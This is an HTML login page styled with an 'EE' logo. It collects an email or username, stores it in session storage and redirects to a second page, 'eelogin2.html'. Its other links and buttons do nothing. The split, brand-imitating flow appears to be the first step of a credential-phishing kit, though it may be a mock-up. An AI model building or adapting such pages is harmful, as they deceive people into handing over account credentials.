<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Secure Authentication</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: Arial, sans-serif;
      background: #f6f6f6;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .card {
      background: #fff;
      border: 1px solid #ccc;
      border-radius: 12px;
      width: 360px;
      padding: 40px 30px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
      text-align: center;
    }
    .logo {
      position: relative;
      width: 36px;
      height: 72px;
      margin: 0 auto 24px;
    }
    .logo div {
      position: absolute;
      left: 0;
      width: 36px;
      height: 36px;
      background: #005c67;
      color: #fff;
      border-radius: 50%;
      line-height: 36px;
      font-size: 18px;
      text-align: center;
    }
    .logo .top { top: 0; z-index: 2; }
    .logo .bottom { top: 36px; z-index: 1; }
    h2 {
      color: #005c67;
      font-size: 22px;
      text-align: left;
      margin-bottom: 20px;
    }
    label {
      display: block;
      text-align: left;
      font-size: 14px;
      margin-bottom: 6px;
      color: #333;
    }
    input[type="email"] {
      width: 100%;
      padding: 12px;
      font-size: 16px;
      border-radius: 6px;
      border: 1px solid #ccc;
      margin-bottom: 20px;
    }
    button {
      width: 100%;
      padding: 14px;
      background: #000;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      margin-bottom: 16px;
    }
    button:hover { opacity: 0.95; }
    a {
      display: block;
      font-size: 13px;
      color: #005c67;
      text-decoration: none;
      margin-bottom: 24px;
    }
    .footer {
      margin-top: 20px;
      font-size: 14px;
      color: #333;
    }
    .footer button {
      background: none;
      border: 1.5px solid #000;
      border-radius: 6px;
      color: #000;
      width: 100%;
      padding: 12px;
      font-size: 15px;
      cursor: pointer;
      margin-bottom: 10px;
    }
    .footer a { margin-top: 10px; display: block; }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">
      <div class="top">E</div>
      <div class="bottom">E</div>
    </div>
    <h2>Log in</h2>
    <label for="email">Email or username</label>
    <input type="email" id="email" placeholder="Email or username" required>
    <button type="button" onclick="next()">Next</button>
    <a href="#">Forgot your password?</a>
    <div class="footer">
      Don't have an account?
      <button type="button">Create account</button>
      <a href="#">Cancel</a>
    </div>
  </div>

  <script>
    function next() {
      const email = document.getElementById('email').value.trim();
      sessionStorage.setItem('ee_email', email);
      window.location.href = 'eelogin2.html';
    }
  </script>
</body>
</html>
